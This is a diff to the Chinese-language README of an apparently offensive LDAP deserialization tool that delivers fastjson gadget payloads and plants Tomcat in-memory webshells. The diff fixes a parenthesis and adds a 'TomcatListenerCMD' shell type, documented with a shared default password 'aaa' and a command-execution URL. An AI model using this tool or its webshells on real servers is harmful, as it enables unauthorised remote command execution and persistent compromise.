@@ -24,7 +24,7 @@ java -jar LDAPDeserialize-tool.jar -p 1389 -g fastjson -c TomcatListenerBehinder
 ```shell
  -b,--base64 <arg>   反序列化打法：序列化数据base64编码值
  -C,--class <arg>    低版本动态请求class实例化方式：class文件请求URL（需自己生成class文件，开启web服务）
- -c,--cmd <arg>      使用内置反序列化链时所要执行的命令，或指定所要打的内存马类型（存在空格时请使用双引号包裹
+ -c,--cmd <arg>      使用内置反序列化链时所要执行的命令，或指定所要打的内存马类型（存在空格时请使用双引号包裹）
  -f,--file <arg>     反序列化打法：序列化数据文件路径
  -g,--gadget <arg>   内置反序列化链
  -ip,--ip <arg>      VPS-IP地址
@@ -51,7 +51,8 @@ execAll (利用链遍历，跑完一次要重新开脚本，依赖：tomcat)
 
 【目前支持的内存马类型】
 目前所有内存马默认密码均为：aaa
-TomcatListenerBehinderByLei (打入改版的马子，需用改版的冰蝎ByLei)
+TomcatListenerBehinderByLei (tomcat listener冰蝎马，打入改版的马子，需用改版的冰蝎ByLei)
+TomcatListenerCMD （tomcat listener cmd马，http://ip:port/xx/zz?pass=aaa&cmd=whoami）
 ```
 
 ### 使用演示
